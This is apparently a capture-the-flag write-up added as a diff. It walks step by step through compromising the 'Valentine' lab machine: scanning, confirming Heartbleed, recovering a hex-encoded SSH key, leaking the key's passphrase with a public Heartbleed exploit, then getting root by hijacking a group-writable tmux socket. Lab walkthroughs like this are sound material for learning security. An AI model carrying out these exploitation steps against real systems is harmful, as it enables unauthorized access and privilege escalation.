@@ -1,0 +1,77 @@
+1. Run a normal nmap scan
+
+nmap -sC -sC -p- -A 10.10.10.79
+
+we have got the output 
+
+22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
+Also port 80 and 443 open with Apache/2.2.22
+
+no other useful information found
+
+2. We decived to run nmap vulnerability scan
+
+As the result the application is vulnerable to POODLE and Heartbleed attacks
+
+3. We have used sslyze --heardbleed 10.10.10.79
+
+and got the confirmation "VULNERABLE - Server is vulnerable to Heartbleed"
+
+ 
+4. In gobuster we have found directories 
+
+/index (Status: 200)
+/dev (Status: 301)
+/encode (Status: 200)
+/decode (Status: 200)
+/omg (Status: 200)
+
+5. We have found /hype_key under /dev folder. It has contents in HEX
+
+we convert those HEX to ASCII using online tools and resulted in
+
+RSA PRIVATE KEY Certificate
+
+6. Save the key in a file name hype.key
+7. check "file hype.key" shows "PEM RSA private key"
+8. chmod 600 hype.key ==> Make it usable key
+9. Download python heartbleed.py exploit  ==> https://gist.github.com/eelsivart/10174134
+
+in the exploit, modify the payload length to ff (max length)
+
+run the exploit as ==> python heartbleed.py -n 100 10.10.10.79  
+-n 100 represents no. of time in loop.
+
+We get the result GVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== 
+Base64 decode it => heartbleedbelievethehype
+
+10. Now we got the SSH Key and password "heartbleedbelievethehype"
+
+Lets login into the site using the command
+
+ssh -i hype.key hype@10.10.10.79 
+
+If hype key asks for passphrase, use "heartbleedbelievethehype"
+
+
+10. Now we got the shell of hype@valentine, and we have to use LinEnum.sh for enumeration
+
+We got the bash history there the command "tmux -S /.devs/dev_sess" was executed
+
+11. Now we check the currently running process from LinEnum.sh output
+
+here the root is able to run usr/bin/tmux -S /.devs/dev_sess
+
+root       1037  0.0  0.1  26416  1124 ?        Ss   00:15   0:16 /usr/bin/tmux -S /.devs/dev_sess
+
+12. check the permissions of /.devs/dev_sess using ==> ls -la /.devs/dev_sess
+
+rw-rw---- 1 root hype 0 Jul 16 00:15 /.devs/dev_sess
+
+
+We are member of hype group and have read-write access to /.devs/dev_sess which is used by tmux as root.
+
+12. So now run => tmux -S /.devs/dev_sess
+
+AND WE ARE ROOT 
+ ..
